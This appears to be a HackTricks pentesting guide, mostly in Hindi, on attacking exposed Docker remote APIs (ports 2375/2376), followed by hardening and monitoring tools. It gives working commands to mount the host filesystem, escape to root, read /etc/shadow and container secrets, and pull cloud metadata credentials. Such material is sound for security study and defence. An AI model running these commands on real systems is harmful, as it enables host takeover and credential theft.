# 2375, 2376 Pentesting Docker

{{#include ../banners/hacktricks-training.md}}

### Docker Basics

#### What is

Docker **कंटेनराइजेशन उद्योग** में **अग्रणी प्लेटफार्म** है, जो **निरंतर नवाचार** का नेतृत्व करता है। यह **पारंपरिक से लेकर भविष्यवादी** अनुप्रयोगों के निर्माण और वितरण को आसान बनाता है, और विभिन्न वातावरणों में उनके **सुरक्षित तैनाती** की सुनिश्चितता करता है।

#### Basic docker architecture

- [**containerd**](http://containerd.io): यह कंटेनरों के लिए एक **मुख्य रनटाइम** है, जो **कंटेनर के जीवनचक्र** का व्यापक **प्रबंधन** करता है। इसमें **छवि स्थानांतरण और भंडारण** के साथ-साथ कंटेनरों के **निष्पादन, निगरानी, और नेटवर्किंग** का प्रबंधन शामिल है। **containerd** पर **अधिक विस्तृत जानकारी** **आगे खोजी गई** है।
- **container-shim** **हेडलैस कंटेनरों** के प्रबंधन में एक **मध्यस्थ** के रूप में महत्वपूर्ण भूमिका निभाता है, जो कंटेनरों के प्रारंभ होने के बाद **runc** से सहजता से कार्यभार संभालता है।
- [**runc**](http://runc.io): इसके **हल्के और सार्वभौमिक कंटेनर रनटाइम** क्षमताओं के लिए प्रसिद्ध, runc **OCI मानक** के साथ संरेखित है। इसका उपयोग containerd द्वारा **OCI दिशानिर्देशों** के अनुसार **कंटेनरों को प्रारंभ और प्रबंधित** करने के लिए किया जाता है, जो मूल **libcontainer** से विकसित हुआ है।
- [**grpc**](http://www.grpc.io) **containerd** और **docker-engine** के बीच **संचार को सुविधाजनक** बनाने के लिए आवश्यक है, जो **कुशल इंटरैक्शन** सुनिश्चित करता है।
- [**OCI**](https://www.opencontainers.org) **रनटाइम और छवियों** के लिए **OCI विनिर्देशों** को बनाए रखने में महत्वपूर्ण है, नवीनतम Docker संस्करण **OCI छवि और रनटाइम** मानकों के साथ **अनुरूप** हैं।

#### Basic commands
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** विशेष रूप से **Docker और Kubernetes** जैसे कंटेनर प्लेटफार्मों की आवश्यकताओं को पूरा करने के लिए विकसित किया गया था। इसका उद्देश्य विभिन्न ऑपरेटिंग सिस्टम, जैसे Linux, Windows, Solaris, और अधिक में कंटेनरों के निष्पादन को **सरल बनाना** है, ऑपरेटिंग सिस्टम-विशिष्ट कार्यक्षमता और सिस्टम कॉल को अमूर्त करके। Containerd का लक्ष्य केवल उन आवश्यक सुविधाओं को शामिल करना है जो इसके उपयोगकर्ताओं द्वारा आवश्यक हैं, अनावश्यक घटकों को छोड़ने का प्रयास करते हुए। हालांकि, इस लक्ष्य को पूरी तरह से प्राप्त करना चुनौतीपूर्ण माना जाता है।

एक प्रमुख डिज़ाइन निर्णय यह है कि **Containerd नेटवर्किंग को संभालता नहीं है**। नेटवर्किंग को वितरित प्रणालियों में एक महत्वपूर्ण तत्व माना जाता है, जिसमें सॉफ़्टवेयर परिभाषित नेटवर्किंग (SDN) और सेवा खोज जैसी जटिलताएँ शामिल हैं जो एक प्लेटफ़ॉर्म से दूसरे प्लेटफ़ॉर्म में काफी भिन्न होती हैं। इसलिए, Containerd नेटवर्किंग पहलुओं को उन प्लेटफार्मों द्वारा प्रबंधित करने के लिए छोड़ देता है जिनका वह समर्थन करता है।

जबकि **Docker Containerd** का उपयोग कंटेनरों को चलाने के लिए करता है, यह ध्यान रखना महत्वपूर्ण है कि Containerd केवल Docker की कार्यक्षमताओं के एक उपसमुच्चय का समर्थन करता है। विशेष रूप से, Containerd में Docker में मौजूद नेटवर्क प्रबंधन क्षमताओं की कमी है और यह सीधे Docker स्वार्म्स के निर्माण का समर्थन नहीं करता है। यह भेद Containerd की केंद्रित भूमिका को एक कंटेनर रनटाइम वातावरण के रूप में उजागर करता है, जो इसके साथ एकीकृत प्लेटफार्मों को अधिक विशेषीकृत कार्यक्षमताएँ सौंपता है।
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** एक ओपन-सोर्स कंटेनर इंजन है जो [Open Container Initiative (OCI) standards](https://github.com/opencontainers) का पालन करता है, जिसे Red Hat द्वारा विकसित और बनाए रखा गया है। यह **daemonless architecture** और **rootless containers** के समर्थन के साथ Docker से कई विशिष्ट विशेषताओं के साथ अलग है, जिससे उपयोगकर्ता बिना रूट विशेषाधिकार के कंटेनर चला सकते हैं।

Podman को Docker के API के साथ संगत बनाने के लिए डिज़ाइन किया गया है, जिससे Docker CLI कमांड का उपयोग किया जा सके। यह संगतता इसके पारिस्थितिकी तंत्र तक फैली हुई है, जिसमें **Buildah** जैसे उपकरण शामिल हैं जो कंटेनर छवियों को बनाने के लिए और **Skopeo** छवि संचालन जैसे push, pull, और inspect के लिए हैं। इन उपकरणों के बारे में अधिक जानकारी उनके [GitHub page](https://github.com/containers/buildah/tree/master/docs/containertools) पर मिल सकती है।

**Key Differences**

- **Architecture**: Docker के क्लाइंट-सरवर मॉडल के विपरीत जिसमें एक बैकग्राउंड डेमन होता है, Podman बिना डेमन के काम करता है। इस डिज़ाइन का अर्थ है कि कंटेनर उन उपयोगकर्ता के विशेषाधिकारों के साथ चलते हैं जो उन्हें शुरू करते हैं, जिससे सुरक्षा में सुधार होता है क्योंकि रूट एक्सेस की आवश्यकता समाप्त हो जाती है।
- **Systemd Integration**: Podman **systemd** के साथ कंटेनरों का प्रबंधन करने के लिए एकीकृत होता है, जिससे systemd इकाइयों के माध्यम से कंटेनर प्रबंधन की अनुमति मिलती है। यह Docker के उपयोग के विपरीत है, जो मुख्य रूप से Docker डेमन प्रक्रिया के प्रबंधन के लिए systemd का उपयोग करता है।
- **Rootless Containers**: Podman की एक महत्वपूर्ण विशेषता यह है कि यह प्रारंभ करने वाले उपयोगकर्ता के विशेषाधिकारों के तहत कंटेनर चलाने की क्षमता रखता है। यह दृष्टिकोण कंटेनर उल्लंघनों से जुड़े जोखिमों को कम करता है, यह सुनिश्चित करते हुए कि हमलावर केवल समझौता किए गए उपयोगकर्ता के विशेषाधिकार प्राप्त करते हैं, न कि रूट एक्सेस।

Podman का दृष्टिकोण Docker के लिए एक सुरक्षित और लचीला विकल्प प्रदान करता है, जो उपयोगकर्ता विशेषाधिकार प्रबंधन और मौजूदा Docker कार्यप्रवाहों के साथ संगतता पर जोर देता है।

> [!NOTE]
> ध्यान दें कि चूंकि podman का लक्ष्य docker के समान API का समर्थन करना है, आप podman के साथ वही कमांड का उपयोग कर सकते हैं जो docker के साथ हैं जैसे:
>
> ```bash
> podman --version
> podman info
> pdoman images ls
> podman ls
> ```

### Basic Information

रिमोट API डिफ़ॉल्ट रूप से 2375 पोर्ट पर चल रहा है जब सक्षम किया गया हो। सेवा डिफ़ॉल्ट रूप से प्रमाणीकरण की आवश्यकता नहीं होगी जिससे एक हमलावर को एक विशेषाधिकार प्राप्त docker कंटेनर शुरू करने की अनुमति मिलती है। रिमोट API का उपयोग करके कोई भी होस्ट / (रूट निर्देशिका) को कंटेनर से जोड़ सकता है और होस्ट के वातावरण की फ़ाइलों को पढ़/लिख सकता है।

**Default port:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeration

#### Manual

ध्यान दें कि docker API को सूचीबद्ध करने के लिए आप `docker` कमांड या `curl` का उपयोग कर सकते हैं जैसे कि निम्नलिखित उदाहरण में:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
यदि आप **`docker` कमांड के साथ रिमोट डॉकर API से संपर्क कर सकते हैं** तो आप **किसी भी** **docker** [**कमांड को निष्पादित**](2375-pentesting-docker.md#basic-commands) कर सकते हैं ताकि सेवा के साथ बातचीत की जा सके।

> [!NOTE]
> आप `export DOCKER_HOST="tcp://localhost:2375"` कर सकते हैं और **`-H`** पैरामीटर का उपयोग करने से **बच सकते हैं**।

**तेज़ विशेषाधिकार वृद्धि**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

कभी-कभी आप **TLS** एंडपॉइंट के लिए **2376** को सक्रिय देखेंगे। मैं इसे डॉकर क्लाइंट के साथ कनेक्ट करने में असमर्थ रहा हूँ लेकिन इसे कर्ल के साथ करना संभव है।
```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
यदि आप इसके बारे में अधिक जानकारी चाहते हैं, तो अधिक जानकारी वहां उपलब्ध है जहाँ मैंने कमांड कॉपी किए: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### स्वचालित
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Compromising

In the following page you can find ways to **escape from a docker container**:

{{#ref}}
../linux-hardening/privilege-escalation/docker-security/
{{#endref}}

इसका दुरुपयोग करके, एक कंटेनर से बाहर निकलना संभव है, आप दूरस्थ मशीन में एक कमजोर कंटेनर चला सकते हैं, इससे बाहर निकल सकते हैं, और मशीन को समझौता कर सकते हैं:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### विशेषाधिकार वृद्धि

यदि आप एक होस्ट के अंदर हैं जो डॉकर का उपयोग कर रहा है, तो आप [**विशेषाधिकार बढ़ाने के लिए इस जानकारी को पढ़ सकते हैं**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### चल रहे Docker कंटेनरों में रहस्यों की खोज करना
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
**env** (पर्यावरण चर अनुभाग) में रहस्यों के लिए जांचें और आप पा सकते हैं:

- पासवर्ड।
- आईपी।
- पोर्ट।
- पथ।
- अन्य… .

यदि आप एक फ़ाइल निकालना चाहते हैं:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### अपने Docker को सुरक्षित करना

#### Docker स्थापना और उपयोग को सुरक्षित करना

- आप अपने वर्तमान docker स्थापना का निरीक्षण करने के लिए उपकरण का उपयोग कर सकते हैं [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security)।
- `./docker-bench-security.sh`
- आप अपने वर्तमान docker स्थापना का निरीक्षण करने के लिए उपकरण का उपयोग कर सकते हैं [https://github.com/kost/dockscan](https://github.com/kost/dockscan)।
- `dockscan -v unix:///var/run/docker.sock`
- आप उपकरण का उपयोग कर सकते हैं [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) यह जानने के लिए कि एक कंटेनर को विभिन्न सुरक्षा विकल्पों के साथ चलाने पर क्या विशेषाधिकार मिलेंगे। यह कुछ सुरक्षा विकल्पों का उपयोग करके एक कंटेनर चलाने के प्रभावों को जानने के लिए उपयोगी है:
- `docker run --rm -it r.j3ss.co/amicontained`
- `docker run --rm -it --pid host r.j3ss.co/amicontained`
- `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Docker छवियों को सुरक्षित करना

- आप [https://github.com/quay/clair](https://github.com/quay/clair) का एक docker छवि का उपयोग कर सकते हैं ताकि यह आपके अन्य docker छवियों को स्कैन करे और कमजोरियों को खोजे।
- `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
- `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Dockerfiles को सुरक्षित करना

- आप उपकरण का उपयोग कर सकते हैं [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) अपने **Dockerfile का निरीक्षण करने** और सभी प्रकार की गलत कॉन्फ़िगरेशन खोजने के लिए। प्रत्येक गलत कॉन्फ़िगरेशन को एक ID दी जाएगी, आप यहाँ [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) देख सकते हैं कि उन्हें कैसे ठीक किया जाए।
- `dockerfilelinter -f Dockerfile`

![](<../images/image (176).png>)

- आप उपकरण का उपयोग कर सकते हैं [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) अपने **Dockerfile का निरीक्षण करने** और सभी प्रकार की गलत कॉन्फ़िगरेशन खोजने के लिए।
- `dockerfilelint Dockerfile`

![](<../images/image (212).png>)

- आप उपकरण का उपयोग कर सकते हैं [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) अपने **Dockerfile का निरीक्षण करने** और सभी प्रकार की गलत कॉन्फ़िगरेशन खोजने के लिए।
- `dockerlint Dockerfile`

![](<../images/image (71).png>)

- आप उपकरण का उपयोग कर सकते हैं [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) अपने **Dockerfile का निरीक्षण करने** और सभी प्रकार की गलत कॉन्फ़िगरेशन खोजने के लिए।
- `hadolint Dockerfile`

![](<../images/image (501).png>)

#### संदिग्ध गतिविधियों का लॉगिंग

- आप उपकरण का उपयोग कर सकते हैं [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) **चल रहे कंटेनरों में संदिग्ध व्यवहार का पता लगाने** के लिए।
- निम्नलिखित खंड में ध्यान दें कि **Falco एक कर्नेल मॉड्यूल संकलित करता है और इसे सम्मिलित करता है**। इसके बाद, यह नियमों को लोड करता है और **संदिग्ध गतिविधियों का लॉगिंग शुरू करता है**। इस मामले में, इसने 2 विशेषाधिकार प्राप्त कंटेनरों का पता लगाया, जिनमें से 1 एक संवेदनशील माउंट के साथ था, और कुछ सेकंड बाद इसने देखा कि एक शेल एक कंटेनर के अंदर खोला गया था।
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Docker की निगरानी

आप docker की निगरानी के लिए auditd का उपयोग कर सकते हैं।

### संदर्भ

- [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
- [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

{{#include ../banners/hacktricks-training.md}}
